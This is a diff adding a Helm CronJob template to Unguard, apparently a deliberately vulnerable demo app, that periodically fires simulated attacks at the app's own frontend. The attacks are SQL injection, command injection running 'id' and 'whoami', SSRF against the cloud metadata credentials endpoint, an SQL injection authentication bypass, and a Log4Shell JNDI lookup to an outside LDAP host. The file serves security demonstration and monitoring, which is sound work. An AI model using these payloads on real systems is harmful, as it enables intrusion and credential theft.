@@ -1,0 +1,91 @@
+{{- /*
+Copyright 2023 Dynatrace LLC
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+http://www.apache.org/licenses-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+*/}}
+{{ if .Values.attackSimulator.enabled }}
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: unguard-attack-simulator-trigger
+  labels:
+    app.kubernetes.io/name: attack-simulator-trigger
+    app.kubernetes.io/part-of: unguard
+spec:
+  schedule: {{ quote .Values.attackSimulator.schedule }}
+  startingDeadlineSeconds: 180
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+            app.kubernetes.io/name: attack-simulator-trigger
+            app.kubernetes.io/part-of: unguard
+        spec:
+          restartPolicy: OnFailure
+          containers:
+            - name: trigger
+              image: curlimages/curl:8.10.1
+              imagePullPolicy: IfNotPresent
+              command:
+                - /bin/sh
+                - -c
+                - |
+                  set -uo pipefail
+                  FRONTEND="{{ .Values.attackSimulator.frontendAddr }}"
+                  ATTACKER_USER="{{ .Values.attackSimulator.attackerUser }}"
+                  JNDI_ENDPOINT="{{ .Values.attackSimulator.jndiEndpoint }}"
+                  COOKIE_JAR=/tmp/cookies
+                  echo "=== Unguard attack simulator @ $(date) ==="
+                  curl -s -o /dev/null -X POST "http://$FRONTEND/api/auth/register" \
+                    -H 'Content-Type: application/json' \
+                    -d "{\"username\":\"$ATTACKER_USER\",\"password\":\"$ATTACKER_USER\"}"
+                  curl -s -c "$COOKIE_JAR" -o /dev/null -X POST "http://$FRONTEND/api/auth/login" \
+                    -H 'Content-Type: application/json' \
+                    -d "{\"username\":\"$ATTACKER_USER\",\"password\":\"$ATTACKER_USER\"}"
+                  JWT=$(grep -o 'jwt\s*[^[:space:]]*' "$COOKIE_JAR" | awk '{print $NF}')
+                  [ -z "$JWT" ] && { echo "login failed"; exit 1; }
+
+                  # 1. SQLi -> profile-service (H2 bio UPDATE)
+                  curl -s -o /dev/null -X POST "http://$FRONTEND/api/user/$ATTACKER_USER/bio" \
+                    -H 'Content-Type: application/json' -b "$COOKIE_JAR" \
+                    -d '{"bioText":"'"'"' WHERE 1=0; SELECT H2VERSION(); --","enableMarkdown":false}'
+
+                  # 2. CMDi -> profile-service (markdown sh -c)
+                  curl -s -o /dev/null -X POST "http://$FRONTEND/api/user/$ATTACKER_USER/bio" \
+                    -b "$COOKIE_JAR" --data-urlencode "bioText=x'"'"'; id; uname -a; #" \
+                    --data-urlencode "enableMarkdown=true" \
+                    -G "http://$FRONTEND/api/user/$ATTACKER_USER/bio"
+
+                  # 3. CMDi -> proxy-service (image url curl)
+                  curl -s -o /dev/null -X POST "http://$FRONTEND/api/post" \
+                    -H 'Content-Type: application/json' -b "$COOKIE_JAR" \
+                    -d '{"imageUrl":"example.com && id && whoami #","content":"cmdi-proxy-demo"}'
+
+                  # 4. SSRF -> proxy-service (share-url HttpClient)
+                  curl -s -o /dev/null -X POST "http://$FRONTEND/api/post" \
+                    -H 'Content-Type: application/json' -b "$COOKIE_JAR" \
+                    -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","content":"ssrf-demo"}'
+
+                  # 5. SQLi auth bypass -> user-auth-service
+                  curl -s -o /dev/null -X POST "http://$FRONTEND/api/auth/login" \
+                    -H 'Content-Type: application/json' \
+                    -d '{"username":"admin\" OR 1=0 UNION ALL SELECT \"user\",\"$2a$10$MolvAKiEajLTuAN2HtaR/O.6h8wGhl3/UPn4WUCZ4sCAtbngzWgfy\",1 FROM DUAL #","password":"password"}'
+
+                  # 6. JNDI -> microblog-service (Log4Shell)
+                  curl -s -o /dev/null -X POST "http://$FRONTEND/api/post" \
+                    -H 'Content-Type: application/json' -b "$COOKIE_JAR" \
+                    -d '{"content":"log4shell-demo ${jndi:ldap://log4shell.tools:1389/unguard-demo}","imageUrl":"'"$JNDI_ENDPOINT"'"}'
+
+                  echo "=== Attacks dispatched at $(date) ==="
+{{ end }}
